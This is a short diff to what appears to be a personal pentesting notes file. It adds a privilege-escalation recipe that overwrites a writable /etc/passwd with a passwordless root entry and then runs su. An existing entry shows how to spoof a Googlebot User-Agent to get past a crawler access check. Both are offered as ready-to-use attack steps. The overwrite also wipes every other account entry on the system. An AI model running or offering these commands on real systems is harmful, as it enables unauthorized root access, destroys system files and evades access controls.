@@ -1,5 +1,13 @@
 # Notes
 
+### Writable /etc/passwd Privilege Escalation
+```
+echo root::0:0:root:/root:/bin/bash > /etc/passwd
+
+su
+```
+
+
 ### Bypass robots.txt "You are not a search engine. Permission denied."
 ```
 Set User-Agent to "User-Agent: Googlebot/2.1 (+http://www.googlebot.com/bot.html)"
